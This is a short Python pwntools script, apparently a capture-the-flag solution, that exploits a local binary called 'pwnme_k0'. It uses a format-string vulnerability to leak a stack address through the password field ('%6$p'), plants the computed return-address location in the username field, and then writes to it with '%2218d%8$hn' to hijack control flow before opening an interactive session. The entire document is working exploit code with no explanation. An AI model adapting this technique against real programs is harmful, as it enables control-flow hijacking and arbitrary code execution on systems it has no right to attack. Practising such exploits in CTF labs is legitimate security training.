#Made by fly_autumn
#x64 hijack retaddr
from pwn import *
p = process("./pwnme_k0")
elf = ELF("./pwnme_k0")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux",arch="amd64")

p.recvuntil(b"Input your username(max lenth:20): \n")
p.sendline(b"11111111")
p.recvuntil(b"Input your password(max lenth:20): \n")
p.sendline(b"%6$p")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"0x")
ret_addr = int(p.recvline().strip(),16) - 0x38
log.success(hex(ret_addr))
p.recvuntil(b">")
p.sendline(b"2")
p.recvuntil(b"please input new username(max lenth:20): ")
p.sendline(p64(ret_addr))
p.recvuntil(b"please input new password(max lenth:20): ")
p.sendline(b"%2218d%8$hn")
p.recvuntil(b">")
p.sendline(b"1")

p.interactive()
